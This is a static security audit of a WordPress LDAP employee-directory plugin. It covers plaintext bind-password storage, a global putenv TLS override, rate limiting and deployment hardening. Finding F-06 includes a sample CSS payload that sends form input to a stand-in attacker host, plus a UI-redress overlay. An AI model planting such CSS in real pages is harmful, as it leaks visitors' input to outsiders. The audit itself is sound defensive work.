# Security Analysis — Employee Directory Business

> Static analysis of source code at commit `97af113`.
> Scope: plugin code, WordPress integration, and infrastructure considerations for VPS cloud and on-premise deployments.
> **No source code was modified during this analysis.**

---

## Table of Contents

1. [Findings Summary](#1-findings-summary)
2. [Application-Layer Findings](#2-application-layer-findings)
3. [Infrastructure Considerations](#3-infrastructure-considerations)
4. [Deployment Checklists](#4-deployment-checklists)
5. [What the Plugin Does Well](#5-what-the-plugin-does-well)

---

## 1. Findings Summary

| # | Title | Severity | Location |
|---|---|---|---|
| F-01 | Bind password stored in plaintext in `wp_options` | **High** | `class-admin.php`, `wp_options` table |
| F-02 | `putenv('LDAPTLS_REQCERT=never')` modifies the global process environment | **High** | `class-ldap-connector.php:56` |
| F-03 | SSL certificate verification can be disabled by any admin | **Medium** | `class-ldap-connector.php:54–58` |
| F-04 | No rate limiting on the AJAX test-connection endpoint | **Medium** | `class-ajax.php:20` |
| F-05 | Raw LDAP error strings returned to the admin panel | **Low** | `class-ldap-connector.php:100–105` |
| F-06 | `custom_css` (BB module) passes through `wp_strip_all_tags()` — CSS injection possible by admins | **Low** | `beaver-builder/frontend.php:42` |
| F-07 | Single global cache key — all shortcode instances share the same transient | **Informational** | `class-cache.php`, `class-shortcode.php` |
| F-08 | `base_ou` field uses `sanitize_text_field()` — not an LDAP DN sanitizer | **Informational** | `class-ldap-connector.php:122` |

**Severity scale used:** High → direct confidentiality/integrity risk. Medium → exploitable under non-default conditions. Low → requires elevated privilege or has limited impact. Informational → no immediate risk, worth noting.

---

## 2. Application-Layer Findings

### F-01 — Bind password stored in plaintext

**Severity:** High
**File:** `includes/class-admin.php` → `sanitize_settings()` (line 167), stored via `update_option(LDAP_ED_OPTION_KEY, ...)`

**What happens:**
The LDAP bind password is serialized into the `wp_options` row alongside all other plugin settings. Any code path that reads `get_option('ldap_ed_settings')` has direct access to it in plaintext.

```php
// class-admin.php — sanitize_settings()
$clean['bind_pass'] = ! empty( $input['bind_pass'] )
    ? $input['bind_pass']
    : ( $existing['bind_pass'] ?? '' );
```

**Risk surface:**
- Direct DB access (SQL client, compromised DB host, MySQL without TLS) exposes the credential immediately.
- Any WordPress plugin with `get_option()` access can read it.
- PHP error logs that dump `get_option()` results will include it in cleartext.

**Mitigations (without code changes):**
- Use a **dedicated, read-only LDAP service account** with search permissions scoped to the target OU only. Leaking a read-only, scoped account is far less critical than leaking a full bind DN with write permissions.
- Enforce TLS on the MySQL connection (`require_secure_transport=ON`).
- Restrict database access to `127.0.0.1` or a private network interface.
- Enable WordPress's `DISALLOW_FILE_EDIT` and `DISALLOW_FILE_MODS` constants to reduce plugin attack surface.

---

### F-02 — `putenv()` sets a global TLS environment variable

**Severity:** High
**File:** `includes/class-ldap-connector.php:56`

```php
putenv( 'LDAPTLS_REQCERT=never' );
```

**What happens:**
`putenv()` writes to the POSIX process environment. Under persistent PHP processes — **php-fpm worker pools, mod_php, PHP-CLI long-running processes** — this change persists for the lifetime of the process and affects every subsequent `ldap_connect()` call in the same worker, regardless of which WordPress request or plugin triggers it.

**Concrete scenario on a shared VPS or multi-tenant host:**
Worker A processes Request 1 (this plugin, `verify_ssl=0`). `LDAPTLS_REQCERT=never` is set.
Worker A is reused for Request 2 (a different plugin making an LDAP call). Its TLS verification is now disabled silently.

**Mitigations (without code changes):**
- **Set `verify_ssl=1` in production at all times.** The `putenv` branch only executes when `verify_ssl='0'`. Keeping verification enabled avoids the side effect entirely.
- On php-fpm: configure `pm.max_requests = 1` on test/staging environments only. Not a production solution.
- On VPS: avoid enabling "Disable SSL Verification" unless temporarily debugging on a non-production server.

---

### F-03 — SSL certificate verification can be disabled via admin UI

**Severity:** Medium
**File:** `includes/class-ldap-connector.php:54`, `admin/views/settings-page.php`, `admin/css/admin.css`

The "Verify SSL Certificate" checkbox is a normal settings field. Any WordPress user with `manage_options` (typically all administrators) can uncheck it, making the LDAP connection susceptible to Man-in-the-Middle (MITM) attacks.

**Risk is higher on:**
- Cloud deployments where the LDAP server is reached over a public or semi-public network.
- Environments using NAT traversal, VPN split tunneling, or third-party LDAP-as-a-service.

**Risk is lower on:**
- On-premise setups where the WordPress server and LDAP directory server are on the same LAN segment with no internet path between them.

**Recommendation:**
- Document that `verify_ssl` must remain `1` in production.
- Consider adding a server-side override constant (e.g., `LDAP_ED_FORCE_VERIFY_SSL`) that ignores the DB setting — **without changing existing behavior**.
- Never disable SSL verification on a system reachable from the internet.

---

### F-04 — No rate limiting on AJAX test-connection endpoint

**Severity:** Medium
**File:** `includes/class-ajax.php:20` — `wp_ajax_ldap_ed_test_connection`

```php
public function test_connection() {
    check_ajax_referer( 'ldap_ed_admin_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) { ... }
    $connector = new LDAP_ED_Connector( $settings );
    $result    = $connector->test_connection();  // performs live LDAP bind + search
}
```

Each call opens a real TCP connection to the LDAP server, binds, runs a full directory search, and returns results. The nonce provides CSRF protection but not throttling.

**Attack scenario:**
A compromised admin session or a CSRF bypass triggers hundreds of rapid successive calls. The LDAP server receives a flood of bind+search requests from the WordPress server's IP — the WordPress server may be blocked by the LDAP server's intrusion detection or the bind account may be temporarily locked.

**Recommendation:**
- WordPress does not ship a built-in rate limiter; implement at the web server layer: `nginx limit_req_zone` or `fail2ban` watching authentication failures.
- Consider adding a WordPress transient-based cooldown (e.g., minimum 10 seconds between test calls per user) in a future version.

---

### F-05 — Raw LDAP error strings exposed in admin panel

**Severity:** Low
**File:** `includes/class-ldap-connector.php:100–104`

```php
$error = ldap_error( $this->connection );
return new \WP_Error(
    'ldap_bind_failed',
    sprintf( __( 'LDAP bind failed: %s', ... ), $error )
);
```

`ldap_error()` returns the raw error string from the LDAP library, which may include the server banner, vendor string, or configuration details. This is propagated to the admin AJAX response and displayed in the admin panel.

**This is admin-only** — the data never reaches unauthenticated users. The risk is that a log file, screenshot, or browser history accidentally exposes server identification strings.

**Recommendation:** Acceptable for administrative tooling. No action required unless operating under strict data-minimization policies.

---

### F-06 — CSS injection via BB module `custom_css`

**Severity:** Low
**File:** `beaver-builder/frontend.php:41–43`

```php
if ( ! empty( $settings->custom_css ) ) {
    echo wp_strip_all_tags( $settings->custom_css );
}
```

`wp_strip_all_tags()` removes HTML markup but does **not** sanitize CSS content. An admin can inject arbitrary CSS into the page, including:

```css
/* exfiltration via CSS */
.ldap-search:focus { background: url("https://attacker.example/log?q=__INPUT__"); }
/* or UI redress */
body::after { content: ""; position: fixed; inset: 0; background: ... }
```

**This is admin-controlled content** — in WordPress's trust model, administrators are trusted to add arbitrary content. The `manage_options` capability implies full site control. This is consistent with how WordPress core treats the Customizer's Custom CSS field.

**Still worth noting for:**
- Multi-admin environments where one admin is less trusted than others.
- Compliance-driven environments (PCI-DSS, HIPAA) that require content-security controls even for privileged users.

---

### F-07 — Single global cache key (Informational)

**File:** `includes/class-cache.php`, constant `LDAP_ED_CACHE_KEY = 'ldap_ed_users'`

All shortcode instances, Elementor widgets, and BB modules share the same `ldap_ed_users` transient. If different pages need different LDAP query parameters (e.g., different base OUs), this is not currently supported — the same cached result is served everywhere. This is an architectural scope limitation, not a security vulnerability.

On standard WordPress (single site): transients are per-site. On multisite: `set_transient()` is scoped per site, so each subsite has its own transient namespace — no cross-site data leakage.

---

### F-08 — `base_ou` uses `sanitize_text_field()` (Informational)

**File:** `includes/class-ldap-connector.php:122`

```php
$base_ou = sanitize_text_field( $this->settings['base_ou'] );
$search  = @ldap_search( $this->connection, $base_ou, $filter, $attributes );
```

`sanitize_text_field()` strips HTML tags and encodes special characters — it is not a dedicated LDAP DN sanitizer. An admin could construct a base DN with characters that are meaningful in LDAP (`*`, `(`, `)`, `\`, `NUL`) to redirect the search.

**However:** the search filter is fully static (`(&(objectClass=person)(mail=*))`) — no user input enters the filter expression. The only injection surface is the base DN, which is set only by admins. In WordPress's trust model, this is an accepted risk.

**For production hardening:**
- Validate that `base_ou` matches the expected DN format before use (e.g., regex: `^[a-zA-Z0-9=,. ]+$`).
- Restrict `base_ou` to a specific sub-tree of the LDAP tree at the service account permission level.

---

## 3. Infrastructure Considerations

### 3.1 VPS Cloud Deployment

#### Network path

The LDAP connection originates from the WordPress PHP process and terminates at the directory server. On a cloud VPS, this path may cross:

| Scenario | Risk | Recommendation |
|---|---|---|
| LDAP server on same VPS | Low — loopback or LAN | Use `ldaps://127.0.0.1` or a Unix socket proxy |
| LDAP server on same VPC/private subnet | Low — no internet path | Restrict security group: allow TCP 636 only from WP server IP |
| LDAP server reachable over public internet | **High** | Require LDAPS with valid certificate. Never set `verify_ssl=0` |
| LDAP-as-a-Service (Azure AD, JumpCloud, etc.) | Medium | Use LDAPS + valid CA cert. Rotate bind credentials regularly |

#### Secrets management

The bind password lives in `wp_options`. On cloud, consider:

- **Environment variable approach:** Set `LDAP_ED_BIND_PASS` as a server environment variable and read it in `wp-config.php` or a `mu-plugin`. The plugin currently does not support this natively — it always reads from the DB option.
- **AWS Secrets Manager / Azure Key Vault / HashiCorp Vault:** Mount the secret as an env variable at container/instance startup.
- **Minimum viable improvement (no code change):** Use a dedicated read-only LDAP service account scoped only to the search OU. Credential compromise then yields only directory-read access, not directory-write.

#### WordPress hardening for cloud

```php
// wp-config.php additions recommended for cloud VPS
define( 'DISALLOW_FILE_EDIT',  true );   // Disable theme/plugin editor
define( 'DISALLOW_FILE_MODS',  true );   // Prevent plugin installs from admin
define( 'FORCE_SSL_ADMIN',     true );   // Admin panel only over HTTPS
define( 'WP_DEBUG',            false );  // Never true in production
define( 'WP_DEBUG_LOG',        false );  // Prevent credential leakage in logs
```

#### PHP-FPM configuration (relevant to F-02)

If running php-fpm, each worker pool processes many requests before recycling. The `putenv('LDAPTLS_REQCERT=never')` call persists in the worker until it restarts.

```ini
; php-fpm pool config — recommended
pm.max_requests = 500          ; Recycle workers periodically
; Alternatively, use dedicated worker pool for WordPress
```

Keep `verify_ssl=1` in the plugin settings to avoid this code path entirely.

---

### 3.2 On-Premise Deployment

#### Network topology

On-premise gives more control over the network path between WordPress and the directory server.

| Component | Recommendation |
|---|---|
| Protocol | LDAPS (TCP 636). Avoid plain LDAP (TCP 389). Avoid STARTTLS unless LDAP server enforces upgrade. |
| Certificate | Use an internal CA cert. Configure the `ca_cert` field with the full path to the CA bundle. Keep `verify_ssl=1`. |
| Network | Firewall egress from the WordPress server: allow only TCP 636 to the specific LDAP server IP. Block all other directory-protocol ports. |
| Bind account | Create a dedicated service account in a non-privileged OU. Grant: `Read` on target OU only. Deny: write, modify, delete, modify schema. |

#### Bind account scoping (Active Directory / OpenLDAP)

**Active Directory — minimal permissions:**
```
Allow: Read, List Contents, Read All Properties
Scope: This object and all descendant objects (target OU only)
Deny: All write permissions
```

**OpenLDAP — minimal ACL (`slapd.conf` or `cn=config`):**
```
access to dn.subtree="ou=employees,dc=example,dc=com"
    by dn="cn=wp-ldap-read,ou=serviceaccounts,dc=example,dc=com" read
    by * none
```

#### Credential rotation

The bind password is stored permanently in `wp_options`. On-premise environments should:
1. Rotate the LDAP service account password on a schedule (e.g., every 90 days).
2. Update the plugin setting and verify connection after each rotation.
3. Consider alerting if the LDAP bind fails (a failed bind mid-TTL means cached stale data is served until the next cache miss).

#### TLS certificate management

The plugin reads a `ca_cert` file path from settings:

```php
// class-ldap-connector.php:60–63
} elseif ( ! empty( $this->settings['ca_cert'] ) && file_exists( $this->settings['ca_cert'] ) ) {
    if ( defined( 'LDAP_OPT_X_TLS_CACERTFILE' ) ) {
        ldap_set_option( null, LDAP_OPT_X_TLS_CACERTFILE, $this->settings['ca_cert'] );
    }
}
```

- The path is read by the PHP process (www-data / php-fpm user). Ensure the file is readable by that user.
- Certificate renewals: update the file in place and clear the plugin cache. The next LDAP call picks up the new cert.
- Recommended path: `/etc/ssl/certs/internal-ldap-ca.pem` (outside the webroot).

---

## 4. Deployment Checklists

### 4.1 Pre-production checklist (both environments)

- [ ] Plugin settings: `verify_ssl` = **1** (Enabled)
- [ ] Bind account: dedicated read-only service account, scoped to the directory OU
- [ ] Bind account: no write, modify, or schema permissions
- [ ] LDAP port: TCP 636 (LDAPS), not 389 (plain LDAP)
- [ ] `WP_DEBUG` = `false` in `wp-config.php`
- [ ] `DISALLOW_FILE_EDIT` = `true` in `wp-config.php`
- [ ] WordPress admin panel: accessible only over HTTPS (`FORCE_SSL_ADMIN`)
- [ ] Database: MySQL bind on `127.0.0.1` only, no remote access
- [ ] WordPress database user: `SELECT`, `INSERT`, `UPDATE`, `DELETE` only — no `FILE`, `SUPER`, `PROCESS`

### 4.2 VPS Cloud additional checks

- [ ] Security group / firewall: TCP 636 outbound allowed only to LDAP server IP
- [ ] Security group: no inbound MySQL from the internet
- [ ] PHP-FPM: `pm.max_requests` set (e.g., 500) to recycle workers
- [ ] `WP_DEBUG_LOG` = `false` — log files must not contain option data
- [ ] Object cache (Redis/Memcached): if configured, protected with `requirepass` / authentication
- [ ] Automated certificate renewal for LDAPS CA cert (if using Let's Encrypt-signed internal CA)

### 4.3 On-premise additional checks

- [ ] LDAP server: `TLSVerifyClient demand` or equivalent enforced server-side
- [ ] Firewall egress from WordPress server: only TCP 636 to LDAP server IP allowed
- [ ] LDAP access log enabled on the directory server for audit trail
- [ ] Bind password rotation schedule defined and documented
- [ ] `ca_cert` file path outside webroot (e.g., `/etc/ssl/certs/`, not `/var/www/html/`)
- [ ] File permissions on `ca_cert`: readable by www-data (or php-fpm user), not world-writable

---

## 5. What the Plugin Does Well

The following security controls are correctly implemented and require no changes.

| Control | Implementation |
|---|---|
| AJAX authorization | `check_ajax_referer()` + `current_user_can('manage_options')` on every handler — correct order |
| Admin-only AJAX | Only `wp_ajax_*` hooks registered, never `wp_ajax_nopriv_*` |
| Output escaping | `esc_html()`, `esc_attr()` used consistently throughout templates and `render_field_*` methods |
| Password never echoed | `bind_pass` field always renders with `value=""` — saved value never returned to the browser |
| LDAP filter injection | Search filter is fully static (`(&(objectClass=person)(mail=*))`); no user input enters it |
| Direct file access | `if (!defined('ABSPATH')) exit;` present in every PHP file |
| Uninstall cleanup | `uninstall.php` correctly gated with `WP_UNINSTALL_PLUGIN`; cleans up options and transients including multisite |
| Connection timeout | `LDAP_OPT_NETWORK_TIMEOUT = 10` set on every connection — prevents request hangs |
| LDAP referrals disabled | `LDAP_OPT_REFERRALS = 0` — prevents open redirect attacks via crafted LDAP referrals |
| Settings sanitization | Every settings field sanitized with the appropriate WordPress function on save |
| Capability gate on settings page | `render_settings_page()` checks `current_user_can('manage_options')` before rendering |

---

*Analysis produced on 2026-02-26. Re-run if the codebase is substantially modified.*
